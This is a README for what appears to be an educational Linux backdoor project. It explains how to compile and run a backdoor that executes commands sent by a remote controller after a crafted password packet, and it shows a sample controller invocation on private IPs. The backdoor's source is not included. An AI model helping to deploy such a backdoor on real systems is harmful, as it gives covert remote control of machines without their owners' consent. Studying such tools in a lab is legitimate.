This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor on a Linux machine that will take command line commands from an external controller and then return the results to the controller. The backdoor will only respond to the controller that supplies it with the correct password.

To compile the application:
make clean
make

To run the backdoor:
./backdoor

The IP address and port the the backdoor will listen for is specified in the backdoor.h file. FILTER_IP and FILTER_PORT are constants that define the ip address and the port number. Once these have been change the program must be re compiled using the commands above.

To run the controller:
./controller -s 192.168.0.15 -p 10022 -d 192.168.0.14 -q 10022 -c ls
The options specified dicates how the password packet that is sent to the back door is crafted.
-s <Source IP Address> -p <Source Port> -d <Destination IP Address> -q <Destination Port> -c <Command To Run>


The backdoor and controller should be run on separate machines for testing.
